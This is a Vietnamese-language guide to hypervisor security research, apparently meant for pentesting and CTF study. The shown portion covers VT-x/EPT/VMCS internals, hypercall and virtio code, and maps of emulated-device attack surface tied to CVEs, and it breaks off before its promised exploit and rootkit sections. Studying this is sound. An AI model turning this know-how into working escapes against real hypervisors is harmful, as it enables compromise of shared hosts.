# VM Escape — Toàn Tập Nghiên Cứu Bảo Mật Ảo Hóa

> **Mục đích**: Tài liệu nghiên cứu bảo mật (offensive security research / authorized pentesting / CTF).  
> Mỗi kỹ thuật có **full code**, phân tích **từng bước**, và case study từ **APT thực tế**.  
> Từ nền tảng kiến trúc CPU đến exploit hypervisor — không bỏ qua bước nào.

---

## Mục lục

- [Phần 0: Roadmap — Bắt đầu từ đâu?](#phần-0-roadmap)
- [Phần 1: Nền tảng Ảo hóa — Phải hiểu trước khi exploit](#phần-1-nền-tảng-ảo-hóa)
  - [1.1 CPU Virtualization (VT-x / AMD-V)](#11-cpu-virtualization)
  - [1.2 Memory Virtualization (EPT / NPT)](#12-memory-virtualization)
  - [1.3 I/O Virtualization (VT-d / SR-IOV / IOMMU)](#13-io-virtualization)
  - [1.4 Hypervisor Architecture (Type-1 vs Type-2)](#14-hypervisor-architecture)
  - [1.5 VMCS / VMCB — Control Structure chi tiết](#15-vmcs--vmcb)
  - [1.6 VM Exit / VM Entry — Luồng thực thi](#16-vm-exit--vm-entry)
- [Phần 2: Attack Surface Mapping](#phần-2-attack-surface-mapping)
  - [2.1 Virtual Device Emulation](#21-virtual-device-emulation)
  - [2.2 Hypercall Interface](#22-hypercall-interface)
  - [2.3 Shared Memory / Clipboard / DnD](#23-shared-memory)
  - [2.4 Paravirtualization (virtio)](#24-paravirtualization)
  - [2.5 GPU Passthrough & vGPU](#25-gpu-passthrough)
  - [2.6 Network Backend](#26-network-backend)
- [Phần 3: QEMU/KVM Escape — Từ cơ bản đến nâng cao](#phần-3-qemukvm-escape)
  - [3.1 Kiến trúc QEMU](#31-kiến-trúc-qemu)
  - [3.2 CVE-2015-3456 — VENOM (FDC overflow)](#32-venom)
  - [3.3 CVE-2015-5165 — RTL8139 Information Leak](#33-rtl8139-info-leak)
  - [3.4 CVE-2015-7504 — pcnet Buffer Overflow](#34-pcnet-overflow)
  - [3.5 CVE-2019-6778 — SLiRP Heap Overflow](#35-slirp-heap-overflow)
  - [3.6 CVE-2020-14364 — USB EHCI OOB](#36-usb-ehci-oob)
  - [3.7 CVE-2021-3947 — virtio-net OOB](#37-virtio-net)
  - [3.8 Viết Exploit QEMU từ đầu — Phương pháp luận](#38-methodology)
- [Phần 4: VMware Escape](#phần-4-vmware-escape)
  - [4.1 VMware Architecture — Backdoor/RPCI](#41-vmware-architecture)
  - [4.2 CVE-2009-1244 — Cloudburst](#42-cloudburst)
  - [4.3 CVE-2017-4901 — DnD/CnP Heap Overflow](#43-dnd-escape)
  - [4.4 CVE-2017-4902/4903/4904/4905 — Pwn2Own 2017](#44-pwn2own-2017)
  - [4.5 CVE-2020-3962 — SVGA Use-After-Free](#45-svga-uaf)
  - [4.6 CVE-2023-20869/20870 — Bluetooth & vSCSI](#46-cve-2023)
  - [4.7 VMware RPCI Protocol — Full Analysis](#47-rpci-protocol)
- [Phần 5: VirtualBox Escape](#phần-5-virtualbox-escape)
  - [5.1 VirtualBox Architecture](#51-vbox-architecture)
  - [5.2 CVE-2018-2698 — HGCM TOCTOU Race](#52-shared-folders)
  - [5.3 CVE-2019-2525/2548 — Chromium 3D Chain](#53-3d-chain)
  - [5.4 CVE-2019-2525 + CVE-2019-2548 — Full Chain Detail](#54-chromium-chain)
  - [5.5 CVE-2020-2902 — VMSVGA 3D UAF](#55-3d-uaf)
  - [5.6 CVE-2021-2145/2310 — NAT Integer Underflow](#56-nat-underflow)
- [Phần 6: Hyper-V Escape](#phần-6-hyper-v-escape)
  - [6.1 Hyper-V Architecture — Partition & Hypercall](#61-hyperv-arch)
  - [6.2 Hypercall Interface & CVE-2018-0886](#62-hypercall-credssp)
  - [6.3 CVE-2020-0904 & RemoteFX vGPU](#63-remotefx)
  - [6.4 CVE-2021-28476 — Hyper-V vmswitch RCE](#64-vmswitch)
  - [6.5 CVE-2022-21907 — HTTP.sys & Network Stack](#65-httpsys)
  - [6.6 Hypercall Fuzzing — Phương pháp Microsoft](#66-hypercall-fuzzing)
- [Phần 7: Xen Escape](#phần-7-xen-escape)
  - [7.1 Xen Architecture](#71-xen-arch)
  - [7.2 XSA Advisory Analysis](#72-xsa)
  - [7.3 CVE-2017-15592 — Page Table Manipulation](#73-page-table)
- [Phần 8: Hypervisor Rootkit — Blue Pill & Beyond](#phần-8-hypervisor-rootkit)
  - [8.1 Blue Pill (Joanna Rutkowska)](#81-blue-pill)
  - [8.2 SubVirt (Microsoft/Michigan)](#82-subvirt)
  - [8.2 SubVirt — Persistent Hypervisor Rootkit](#82-subvirt)
  - [8.3 Vitriol — macOS Hypervisor Rootkit](#83-vitriol)
  - [8.4 Hypervisor-based Keylogger](#84-keylogger)
  - [8.5 Minimal Hypervisor Rootkit — Full Code](#85-minimal-rootkit)
- [Phần 9: APT Case Studies — Học từ thực chiến](#phần-9-apt-case-studies)
  - [9.1 APT29 (Cozy Bear) — VM-aware Malware](#91-apt29)
  - [9.2 Equation Group — Firmware-Level Capabilities](#92-equation-group)
  - [9.3 Turla — Sophisticated Persistence](#93-turla)
  - [9.4 Sandworm — ESXi Targeting](#94-sandworm)
  - [9.5 UNC3886 — vCenter & ESXi Backdoor](#95-unc3886)
  - [9.6 MAESTRO Campaign — ESXi 0-day Chain (2025)](#96-maestro)
  - [9.7 KVM Escape Researchers (2026)](#97-kvm-researchers)
- [Phần 10: Fuzzing Hypervisor](#phần-10-fuzzing)
  - [10.1 AFL/LibFuzzer cho QEMU Device](#101-afl-qemu)
  - [10.2 hAFL2 — Hyper-V Fuzzing](#102-hafl2)
  - [10.3 Nyx — Coverage-guided Hypervisor Fuzzing](#103-nyx)
  - [10.4 Custom Harness cho VMware](#104-custom-harness)
- [Phần 11: Container Escape (Bonus — liên quan VM)](#phần-11-container-escape)
  - [11.1 Docker Escape vs VM Escape](#111-docker-vs-vm)
  - [11.2 CVE-2019-5736 — runc Overwrite](#112-runc)
  - [11.3 Kata Containers — VM-backed Containers](#113-kata)
- [Phần 12: Lab Setup — Xây dựng môi trường thực hành](#phần-12-lab-setup)
- [Phần 13: Defense & Detection](#phần-13-defense)
- [Phần 14: Tài nguyên — Blog, Paper, Tool, CTF](#phần-14-tài-nguyên)

---

## Phần 0: Roadmap

### Bắt đầu từ đâu?

```
Level 0 — Nền tảng (2-3 tháng)
├── Hệ điều hành: Linux kernel internals, Windows internals
├── Lập trình: C/C++ thành thạo, Assembly x86_64
├── Reverse Engineering: IDA Pro, Ghidra, GDB
├── Exploit dev: Stack/Heap overflow, ROP, Use-After-Free
└── Ảo hóa cơ bản: Cài đặt và sử dụng QEMU, VMware, VBox

Level 1 — Hiểu kiến trúc (1-2 tháng)
├── Đọc Intel SDM Volume 3, Chapter 23-33 (VMX)
├── Viết mini hypervisor từ đầu (SimpleVisor, hvpp)
├── Hiểu VMCS, VM Exit, EPT
└── Đọc source code QEMU (device emulation)

Level 2 — Phân tích CVE cũ (2-3 tháng)
├── Reproduce VENOM (CVE-2015-3456)
├── Reproduce RTL8139 leak (CVE-2015-5165)
├── Phân tích VMware Cloudburst
└── Viết exploit cho VirtualBox CVE cũ

Level 3 — Fuzzing & Hunting (ongoing)
├── Fuzz QEMU device bằng AFL
├── Audit VMware RPCI handler
├── Fuzz Hyper-V hypercall
└── Tìm bug mới trong VirtualBox 3D

Level 4 — Nâng cao (ongoing)
├── Chain exploit: info leak → RCE → escape
├── Hypervisor rootkit development
├── Viết detection/defense cho Blue Team
└── Pwn2Own preparation
```

### Sách & Tài liệu bắt buộc đọc

| Tài liệu | Tại sao cần đọc |
|-----------|------------------|
| Intel SDM Vol.3 Ch.23-33 | Spec chính thức VMX, không hiểu → không exploit được |
| AMD APM Vol.2 Ch.15 | SVM (AMD-V), tương tự Intel nhưng khác cấu trúc |
| "Hypervisor From Scratch" (Sina Karvandi) | Từng bước build hypervisor, hiểu sâu internals |
| QEMU source code | Target chính, phải đọc device emulation code |
| "A Guide to Kernel Exploitation" | Nền tảng kernel exploit, cần cho post-escape |
| "The Art of Software Security Assessment" | Audit code methodology |
|Erta Research - VM Escape Blog Series | Hướng dẫn thực hành cụ thể |

---

## Phần 1: Nền tảng Ảo hóa

### 1.1 CPU Virtualization

#### Intel VT-x (VMX — Virtual Machine Extensions)

CPU hỗ trợ ảo hóa bằng cách thêm 2 chế độ thực thi mới:

- **VMX Root Mode**: Hypervisor chạy ở đây (ring 0 của host)
- **VMX Non-Root Mode**: Guest OS chạy ở đây (tưởng mình đang ở ring 0)

```
┌─────────────────────────────────────────┐
│             VMX Root Mode               │
│  ┌──────────────────────────────────┐   │
│  │         Hypervisor (VMM)         │   │
│  │  - Quản lý VMCS                 │   │
│  │  - Xử lý VM Exit               │   │
│  │  - Emulate thiết bị             │   │
│  └──────────────────────────────────┘   │
│              ▲ VM Exit  │ VM Entry      │
│              │          ▼               │
│  ┌──────────────────────────────────┐   │
│  │       VMX Non-Root Mode          │   │
│  │  ┌─────────┐  ┌──────────────┐   │   │
│  │  │Guest OS │  │ Guest Apps   │   │   │
│  │  │(Ring 0) │  │ (Ring 3)     │   │   │
│  │  └─────────┘  └──────────────┘   │   │
│  └──────────────────────────────────┘   │
└─────────────────────────────────────────┘
```

#### VMX Instructions

```nasm
; === Các instruction VMX quan trọng ===

; Bật VMX mode
VMXON   [vmxon_region]    ; Enable VMX operation, cần VMXON region 4KB aligned

; Quản lý VMCS (Virtual Machine Control Structure)
VMCLEAR [vmcs_addr]       ; Initialize/clear VMCS
VMPTRLD [vmcs_addr]       ; Load VMCS pointer (set active VMCS)
VMREAD  reg, field        ; Đọc field từ current VMCS
VMWRITE field, reg        ; Ghi field vào current VMCS

; Chuyển đổi context
VMLAUNCH                  ; Lần đầu enter guest (VM Entry)
VMRESUME                  ; Re-enter guest sau VM Exit

; Gọi hypervisor từ guest
VMCALL                    ; Guest → Hypervisor (hypercall)

; Tắt VMX
VMXOFF                    ; Disable VMX operation

; Các instruction đặc biệt khác
INVEPT  type, desc        ; Invalidate EPT translations
INVVPID type, desc        ; Invalidate VPID-tagged TLB entries
```

#### Kiểm tra CPU hỗ trợ VT-x

```c
/* check_vmx_support.c - Kiểm tra CPU có hỗ trợ VMX không */
#include <stdio.h>
#include <stdint.h>

typedef struct {
    uint32_t eax, ebx, ecx, edx;
} cpuid_result_t;

static inline cpuid_result_t do_cpuid(uint32_t leaf, uint32_t subleaf) {
    cpuid_result_t r;
    __asm__ volatile(
        "cpuid"
        : "=a"(r.eax), "=b"(r.ebx), "=c"(r.ecx), "=d"(r.edx)
        : "a"(leaf), "c"(subleaf)
    );
    return r;
}

/*
 * rdmsr() cần ring-0 privilege (kernel module hoặc /dev/cpu/N/msr).
 * Từ userspace, đọc MSR qua: sudo rdmsr 0x480
 * Hoặc dùng msr-tools: modprobe msr && rdmsr 0x3A
 * Code dưới chỉ chạy được trong kernel context.
 */
static inline uint64_t rdmsr(uint32_t msr) {
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

#define IA32_FEATURE_CONTROL 0x3A
#define IA32_VMX_BASIC       0x480
#define IA32_VMX_PINBASED    0x481
#define IA32_VMX_PROCBASED   0x482
#define IA32_VMX_EXIT        0x483
#define IA32_VMX_ENTRY       0x484
#define IA32_VMX_PROCBASED2  0x48B
#define IA32_VMX_EPT_VPID    0x48C

void check_vmx(void) {
    cpuid_result_t r = do_cpuid(1, 0);
    
    /* Bit 5 of ECX = VMX support */
    if (!(r.ecx & (1 << 5))) {
        printf("[-] CPU does NOT support VMX\n");
        return;
    }
    printf("[+] CPU supports VMX (VT-x)\n");
    
    /* Check IA32_FEATURE_CONTROL MSR */
    uint64_t feat = rdmsr(IA32_FEATURE_CONTROL);
    printf("[*] IA32_FEATURE_CONTROL = 0x%llx\n", (unsigned long long)feat);
    printf("    Lock bit: %s\n", (feat & 1) ? "LOCKED" : "unlocked");
    printf("    VMXON in SMX: %s\n", (feat & (1 << 1)) ? "enabled" : "disabled");
    printf("    VMXON outside SMX: %s\n", (feat & (1 << 2)) ? "enabled" : "disabled");
    
    /* VMX Basic info */
    uint64_t basic = rdmsr(IA32_VMX_BASIC);
    printf("[*] IA32_VMX_BASIC = 0x%llx\n", (unsigned long long)basic);
    printf("    VMCS revision: %u\n", (uint32_t)(basic & 0x7FFFFFFF));
    printf("    VMCS region size: %u bytes\n", (uint32_t)((basic >> 32) & 0x1FFF));
    printf("    Memory type: %s\n", ((basic >> 50) & 0xF) == 6 ? "Write-Back" : "Other");
    
    /* EPT/VPID capabilities */
    uint64_t procbased = rdmsr(IA32_VMX_PROCBASED);
    if ((procbased >> 32) & (1 << 31)) { /* Secondary controls available */
        uint64_t procbased2 = rdmsr(IA32_VMX_PROCBASED2);
        printf("[*] Secondary proc-based controls:\n");
        printf("    EPT: %s\n", ((procbased2 >> 32) & (1 << 1)) ? "supported" : "no");
        printf("    VPID: %s\n", ((procbased2 >> 32) & (1 << 5)) ? "supported" : "no");
        printf("    Unrestricted guest: %s\n", 
               ((procbased2 >> 32) & (1 << 7)) ? "supported" : "no");
    }
}

int main(void) {
    check_vmx();
    return 0;
}
```

### 1.2 Memory Virtualization

#### Extended Page Tables (EPT) — Intel

EPT thêm một tầng translation nữa giữa Guest Physical Address (GPA) và Host Physical Address (HPA):

```
Guest Virtual Addr (GVA)
    │
    ▼ [Guest Page Tables - controlled by guest OS]
Guest Physical Addr (GPA)
    │
    ▼ [EPT Tables - controlled by hypervisor]
Host Physical Addr (HPA)
    │
    ▼ [Physical Memory]
```

#### Cấu trúc EPT (4-level paging)

```
EPT PML4 (CR3-like, pointed by VMCS)
├── EPT PDPT Entry [512 entries]
│   ├── EPT PD Entry [512 entries]
│   │   ├── EPT PT Entry [512 entries]
│   │   │   └── 4KB Page Frame
│   │   └── 2MB Large Page (nếu bit 7 set)
│   └── 1GB Huge Page (nếu bit 7 set)
```

#### EPT Entry Format (mỗi entry 64-bit)

```c
/*
 * EPT Page Table Entry format:
 *
 * Bits 2:0   - Access rights (R/W/X)
 * Bits 5:3   - Memory type (UC=0, WC=1, WT=4, WP=5, WB=6)
 * Bit  6     - Ignore PAT
 * Bit  7     - Large page (1GB/2MB)
 * Bit  8     - Accessed (if enabled)
 * Bit  9     - Dirty (if enabled)
 * Bit  10    - User-mode execute (if MBEC)
 * Bits 51:12 - Physical address of next level / page frame
 * Bit  63    - Suppress #VE
 */

#define EPT_READ    (1ULL << 0)
#define EPT_WRITE   (1ULL << 1)
#define EPT_EXEC    (1ULL << 2)
#define EPT_MEMTYPE_WB  (6ULL << 3)
#define EPT_LARGE   (1ULL << 7)
#define EPT_ACCESSED (1ULL << 8)
#define EPT_DIRTY   (1ULL << 9)

typedef struct {
    uint64_t entries[512];
} __attribute__((aligned(4096))) ept_table_t;

/*
 * Build a 4-level EPT identity map (GPA == HPA) for first 4GB.
 * 
 * QUAN TRỌNG: EPT entries cần PHYSICAL address, không phải virtual!
 * Code dưới dùng virt_to_phys() (kernel) hoặc tính manual.
 * Dùng (uint64_t)&var chỉ đúng khi identity-mapped (VA == PA).
 * Trong kernel module thực tế, phải dùng virt_to_phys(&pdpt).
 */
void build_ept_identity_map(ept_table_t *pml4) {
    static ept_table_t pdpt __attribute__((aligned(4096)));
    static ept_table_t pd[4] __attribute__((aligned(4096)));
    
    /* PML4 -> PDPT (cần physical address của pdpt!) */
    pml4->entries[0] = virt_to_phys(&pdpt) | EPT_READ | EPT_WRITE | EPT_EXEC;
    
    for (int i = 0; i < 4; i++) {
        /* PDPT -> PD (physical address!) */
        pdpt.entries[i] = virt_to_phys(&pd[i]) | EPT_READ | EPT_WRITE | EPT_EXEC;
        
        for (int j = 0; j < 512; j++) {
            /* PD entries: 2MB large pages */
            uint64_t phys = (uint64_t)(i * 512 + j) * (2 * 1024 * 1024);
            pd[i].entries[j] = phys | EPT_READ | EPT_WRITE | EPT_EXEC 
                             | EPT_LARGE | EPT_MEMTYPE_WB;
        }
    }
}
```

#### Tại sao EPT quan trọng cho VM Escape?

EPT violation (EPT misconfiguration) gây VM Exit → hypervisor xử lý. Nếu hypervisor xử lý sai:
- **EPT confused deputy**: Guest trick hypervisor map trang nhớ sai → đọc/ghi host memory
- **TOCTOU race**: Thay đổi mapping giữa check và use
- **EPT splitting attack**: Tách EPT entry giữa read/execute → execute hidden code

### 1.3 I/O Virtualization

#### Ba phương pháp I/O cho VM

```
1. Full Emulation (truyền thống)
   Guest I/O → VM Exit → Hypervisor emulate → trả kết quả
   + Tương thích cao, guest không cần driver đặc biệt
   - Chậm (mỗi I/O = VM Exit), attack surface LỚN

2. Paravirtualization (virtio)
   Guest biết mình là VM, dùng driver tối ưu
   + Nhanh hơn nhiều (batch I/O, shared rings)
   - Guest cần driver đặc biệt, vẫn có attack surface

3. Device Passthrough (VT-d / IOMMU)
   Guest truy cập hardware trực tiếp qua IOMMU
   + Gần native performance
   - Hardware dedicat, IOMMU bypass = game over
```

#### IOMMU (VT-d) và DMA Attack

```c
/*
 * IOMMU ngăn DMA attack bằng cách translate Device Physical Address:
 *
 * Không có IOMMU:
 *   PCIe Device → DMA → Physical Memory (TOÀN BỘ!)
 *   → Device trong VM có thể đọc/ghi HOST memory
 *
 * Có IOMMU:
 *   PCIe Device → DMA → IOMMU translate → Chỉ memory được phép
 *   → Device bị giới hạn trong vùng nhớ của VM
 *
 * IOMMU bypass = VM escape qua hardware:
 *   - ACS (Access Control Services) misconfiguration
 *   - Peer-to-peer PCIe routing bypass IOMMU
 *   - IOMMU TLB invalidation race
 */
```

### 1.4 Hypervisor Architecture

#### Type-1 (Bare-Metal) vs Type-2 (Hosted)

```
Type-1 (Bare-Metal):                Type-2 (Hosted):
┌─────────┬─────────┐              ┌──────────────────┐
│  VM 1   │  VM 2   │              │  VM 1  │  VM 2   │
├─────────┴─────────┤              ├────────┴─────────┤
│   HYPERVISOR      │              │  Hypervisor      │
│   (ESXi/Xen/HV)  │              │  (QEMU/VBox)     │
├───────────────────┤              ├──────────────────┤
│   Hardware        │              │  Host OS         │
└───────────────────┘              ├──────────────────┤
                                   │  Hardware        │
                                   └──────────────────┘
VMware ESXi                        QEMU/KVM
Microsoft Hyper-V                  VirtualBox
Xen                                VMware Workstation

Escape Type-1 → code execution     Escape Type-2 → code execution
trên hypervisor kernel              trên host OS (thường root/SYSTEM)
(RẤT nghiêm trọng)                 (cũng rất nghiêm trọng)
```

#### QEMU/KVM — Hybrid Architecture

```
┌─────────────────────────────────────────────────────┐
│                    Guest VM                         │
│  ┌─────────────┐  ┌─────────────────────────────┐   │
│  │ Guest OS    │  │ Guest Applications          │   │
│  └──────┬──────┘  └─────────────────────────────┘   │
│         │ Port I/O, MMIO, PCI config                │
└─────────┼───────────────────────────────────────────┘
          │ VM Exit
          ▼
┌─────────────────────────────────────────────────────┐
│                   KVM (kernel)                      │
│  - VMCS management                                  │
│  - VM Entry/Exit handling                           │
│  - EPT management                                   │
│  - Interrupt injection                              │
│  - Handles simple exits (CPUID, MSR, HLT)          │
│                                                     │
│  KVM_RUN ioctl → nếu exit cần userspace:           │
│  return to QEMU với exit_reason                     │
└─────────────────┬───────────────────────────────────┘
                  │ ioctl return
                  ▼
┌─────────────────────────────────────────────────────┐
│               QEMU (userspace)                      │
│  ┌──────────────────────────────────────────────┐   │
│  │ Device Emulation (CÁI NÀY LÀ ATTACK SURFACE)│   │
│  │  ├── e1000 NIC         ├── IDE controller    │   │
│  │  ├── RTL8139 NIC       ├── AHCI/SATA        │   │
│  │  ├── virtio-net        ├── floppy (FDC)     │   │
│  │  ├── virtio-blk        ├── USB (EHCI/xHCI)  │   │
│  │  ├── VGA/SVGA          ├── AC97/HDA audio   │   │
│  │  ├── virtio-gpu        ├── serial/parallel   │   │
│  │  └── PCIe bridge       └── ACPI/APIC        │   │
│  └──────────────────────────────────────────────┘   │
│  ┌──────────────┐  ┌───────────────────────────┐    │
│  │ Main loop    │  │ Memory mapping (RAM bars) │    │
│  │ (event loop) │  │ MMIO dispatch             │    │
│  └──────────────┘  └───────────────────────────┘    │
└─────────────────────────────────────────────────────┘
```

### 1.5 VMCS — Virtual Machine Control Structure

VMCS là cấu trúc dữ liệu 4KB mà CPU dùng để quản lý VM Entry/Exit.

```c
/*
 * VMCS Fields — các trường quan trọng nhất
 * (Encoding theo Intel SDM Appendix B)
 */

/* === Guest State Area === */
#define VMCS_GUEST_CR0              0x6800
#define VMCS_GUEST_CR3              0x6802
#define VMCS_GUEST_CR4              0x6804
#define VMCS_GUEST_ES_SELECTOR      0x0800
#define VMCS_GUEST_CS_SELECTOR      0x0802
#define VMCS_GUEST_SS_SELECTOR      0x0804
#define VMCS_GUEST_DS_SELECTOR      0x0806
#define VMCS_GUEST_RSP              0x681C
#define VMCS_GUEST_RIP              0x681E
#define VMCS_GUEST_RFLAGS           0x6820
#define VMCS_GUEST_GDTR_BASE        0x6816
#define VMCS_GUEST_IDTR_BASE        0x6818

/* === Host State Area === */
#define VMCS_HOST_CR0               0x6C00
#define VMCS_HOST_CR3               0x6C02  /* <-- Giá trị CR3 của host! */
#define VMCS_HOST_CR4               0x6C04
#define VMCS_HOST_RSP               0x6C14  /* <-- Stack pointer host */
#define VMCS_HOST_RIP               0x6C16  /* <-- Entry point VM Exit handler */

/* === VM Execution Controls === */
#define VMCS_PIN_BASED_CONTROLS     0x4000
#define VMCS_PROC_BASED_CONTROLS    0x4002
#define VMCS_PROC_BASED_CONTROLS2   0x401E
#define VMCS_EXCEPTION_BITMAP       0x4004
#define VMCS_EPT_POINTER            0x201A  /* <-- EPT root */

/* === VM Exit Information === */
#define VMCS_EXIT_REASON            0x4402
#define VMCS_EXIT_QUALIFICATION     0x6400
#define VMCS_GUEST_LINEAR_ADDR      0x640A
#define VMCS_GUEST_PHYS_ADDR        0x2400

/*
 * VM Exit Reasons (quan trọng cho exploit):
 *   0  - Exception or NMI
 *   1  - External interrupt
 *   7  - Interrupt window
 *   10 - CPUID
 *   12 - HLT
 *   18 - VMCALL
 *   28 - CR access
 *   30 - I/O instruction      ← Port I/O → QEMU device emulation
 *   31 - RDMSR
 *   32 - WRMSR
 *   48 - EPT violation         ← MMIO → QEMU device emulation
 *   49 - EPT misconfiguration
 *   55 - XSETBV
 */
```

### 1.6 VM Exit / VM Entry Flow

```
┌─────────── VM Entry Flow ───────────────────┐
│                                              │
│ 1. VMLAUNCH/VMRESUME instruction             │
│ 2. CPU checks VMCS consistency               │
│ 3. Load guest state from VMCS                │
│    - CR0/CR3/CR4                             │
│    - RSP, RIP, RFLAGS                        │
│    - Segment registers                       │
│    - MSRs (từ VM-entry MSR-load area)        │
│ 4. Load VM-execution controls                │
│ 5. Switch to VMX non-root mode               │
│ 6. Guest code resumes at guest RIP           │
│                                              │
└──────────────────────────────────────────────┘

┌─────────── VM Exit Flow ────────────────────┐
│                                              │
│ 1. Sensitive instruction / event in guest    │
│    (I/O, CPUID, EPT violation, etc.)         │
│ 2. CPU saves guest state to VMCS             │
│ 3. Load host state from VMCS                 │
│    - CR0/CR3/CR4 → host values              │
│    - RSP → host stack                        │
│    - RIP → VM exit handler entry point       │
│ 4. Store exit reason + qualification         │
│ 5. Switch to VMX root mode                   │
│ 6. Host code runs at host RIP                │
│                                              │
│ KVM exit handler:                            │
│   if (can_handle_in_kernel)                  │
│     handle_exit();  /* CPUID, MSR, etc. */   │
│     vmresume();                              │
│   else                                       │
│     return_to_userspace(exit_reason);        │
│     /* QEMU handles: I/O, MMIO, etc. */     │
│                                              │
└──────────────────────────────────────────────┘
```

---

## Phần 2: Attack Surface Mapping

### 2.1 Virtual Device Emulation — Attack Surface chính

Đây là target #1 cho VM escape. QEMU emulate hàng trăm thiết bị, mỗi cái là C code xử lý input từ guest.

```
Attack Surface theo Protocol:

1. Port I/O (IN/OUT instructions)
   Guest: outb(0x1F7, data)  →  VM Exit (I/O)  →  QEMU: ide_ioport_write()
   
2. MMIO (Memory-Mapped I/O)  
   Guest: *(volatile uint32_t*)0xFEBF0000 = data  →  EPT violation  →  QEMU: e1000_mmio_write()
   
3. PCI Configuration Space
   Guest: PCI config read/write  →  QEMU: pci_host_config_write()
   
4. DMA (Direct Memory Access)
   Guest sets up DMA descriptors → Device reads guest memory → QEMU: dma_memory_read()
   *** DMA là attack vector cực kỳ quan trọng vì device đọc GUEST memory
   *** Guest control DMA descriptor → control data device đọc ***
```

#### Bản đồ thiết bị QEMU và CVE tương ứng

```
┌────────────────────┬──────────────────────┬──────────────────────┐
│ Device             │ Interface            │ Notable CVEs         │
├────────────────────┼──────────────────────┼──────────────────────┤
│ Floppy (FDC)       │ Port I/O 0x3F0-0x3F7 │ CVE-2015-3456 VENOM │
│ RTL8139            │ Port I/O + MMIO      │ CVE-2015-5165 leak  │
│ pcnet (Am79C970)   │ Port I/O + MMIO      │ CVE-2015-7504 BOF   │
│ e1000/e1000e       │ MMIO + DMA           │ CVE-2016-1568 UAF   │
│ ne2000             │ Port I/O             │ CVE-2016-2841 OOB   │
│ virtio-net         │ MMIO + DMA           │ CVE-2021-3947 OOB   │
│ USB EHCI           │ MMIO + DMA           │ CVE-2020-14364 OOB  │
│ USB xHCI           │ MMIO + DMA           │ Multiple OOB        │
│ IDE/AHCI           │ Port I/O + MMIO+DMA  │ CVE-2015-6815 DoS   │
│ VGA/SVGA           │ Port I/O + MMIO      │ CVE-2016-3710 VBE   │
│ AC97/HDA Audio     │ MMIO + DMA           │ CVE-2017-5525 leak  │
│ Megasas SCSI       │ MMIO + DMA           │ CVE-2017-9503 UAF   │
│ SLiRP (network)    │ User-mode networking │ CVE-2019-6778 heap  │
│ virtio-gpu         │ MMIO + DMA           │ CVE-2021-3546 OOB   │
└────────────────────┴──────────────────────┴──────────────────────┘
```

### 2.2 Hypercall Interface

```c
/*
 * Hypercall = guest gọi hàm của hypervisor (tương tự syscall)
 * 
 * KVM hypercalls: VMCALL instruction với convention:
 *   EAX = hypercall number
 *   EBX, ECX, EDX, ESI = arguments
 *   EAX = return value
 *
 * Attack vector: nếu hypervisor validate argument sai → exploit
 */

/* KVM hypercall numbers */
#define KVM_HC_VAPIC_POLL_IRQ    1
#define KVM_HC_MMU_OP            2   /* deprecated, was buggy */
#define KVM_HC_FEATURES          3
#define KVM_HC_PPC_MAP_MAGIC_PAGE 4
#define KVM_HC_KICK_CPU          5
#define KVM_HC_CLOCK_PAIRING     9
#define KVM_HC_SEND_IPI          10
#define KVM_HC_SCHED_YIELD       11
#define KVM_HC_MAP_GPA_RANGE     12

/* Guest-side: thực hiện hypercall */
static inline long kvm_hypercall0(unsigned int nr) {
    long ret;
    asm volatile("vmcall"
        : "=a"(ret)
        : "a"(nr)
        : "memory");
    return ret;
}

static inline long kvm_hypercall2(unsigned int nr, unsigned long p1, 
                                   unsigned long p2) {
    long ret;
    asm volatile("vmcall"
        : "=a"(ret)
        : "a"(nr), "b"(p1), "c"(p2)
        : "memory");
    return ret;
}

/* Hyper-V hypercalls — phức tạp hơn nhiều */
#define HVCALL_POST_MESSAGE        0x005C
#define HVCALL_SIGNAL_EVENT        0x005D
#define HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE 0x0002

/* Xen hypercalls */
#define __HYPERVISOR_set_trap_table  0
#define __HYPERVISOR_mmu_update      1
#define __HYPERVISOR_console_io      18
#define __HYPERVISOR_grant_table_op  20
#define __HYPERVISOR_event_channel_op 32
```

### 2.3 Shared Memory / Clipboard / Drag-and-Drop

```
Shared functionality giữa Host ↔ Guest là attack surface lớn:

VMware:
├── VMware Tools → RPCI/TCLO protocol
├── Shared Folders (HGFS) → filesystem operations
├── Drag and Drop → phức tạp, nhiều CVE
├── Copy/Paste → buffer handling bugs
└── Unity Mode → window management

VirtualBox:
├── Guest Additions → VBoxGuest driver
├── Shared Folders → vboxsf 
├── Shared Clipboard → buffer handling
├── Drag and Drop → phức tạp
└── 3D Acceleration → Chromium/VMSVGA

Hyper-V:
├── VMBus → virtual bus protocol
├── Integration Services → KVP, VSS, etc.
├── Enhanced Session Mode → RDP-based
└── RemoteFX vGPU → GPU virtualization

QEMU:
├── virtio-serial → host↔guest communication
├── SPICE/VNC → display protocol
├── 9pfs → filesystem sharing
└── vhost-user → userspace I/O
```

### 2.4 Paravirtualization — virtio

```c
/*
 * virtio devices sử dụng shared memory rings (virtqueues):
 * 
 * ┌──── Guest ─────┐     ┌──── Host (QEMU) ────┐
 * │                 │     │                      │
 * │  Driver fills   │     │  Device processes    │
 * │  descriptors    │     │  descriptors         │
 * │  in Available   │────>│  from Available ring │
 * │  Ring           │     │                      │
 * │                 │     │  Puts results in     │
 * │  Reads results  │<────│  Used Ring           │
 * │  from Used Ring │     │                      │
 * └─────────────────┘     └──────────────────────┘
 *
 * Virtqueue layout trong shared memory:
 *   Descriptor Table: array of {addr, len, flags, next}
 *   Available Ring: {flags, idx, ring[]}
 *   Used Ring: {flags, idx, ring[{id, len}]}
 *
 * Attack vector:
 *   Guest controls descriptor table → controls addr/len QEMU reads
 *   → OOB read/write nếu QEMU không validate đúng
 */

/* virtio descriptor structure */
struct vring_desc {
    uint64_t addr;    /* Guest physical address — GUEST CONTROLLED */
    uint32_t len;     /* Length — GUEST CONTROLLED */
    uint16_t flags;   /* VRING_DESC_F_NEXT, _WRITE, _INDIRECT */
    uint16_t next;    /* Index of next descriptor in chain */
};

/* 
 * Ví dụ bug pattern:
 * QEMU code đọc guest memory qua DMA:
 *   dma_memory_read(dma, desc.addr, buf, desc.len)
 * Nếu desc.len > sizeof(buf) → buffer overflow trong QEMU process!
 */
```

### 2.5 GPU Passthrough & vGPU Attack Surface

```
GPU virtualization tạo attack surface rất lớn:

1. Software Rendering (VGA/SVGA emulation)
   - QEMU VGA: cirrus, stdvga, qxl, virtio-gpu
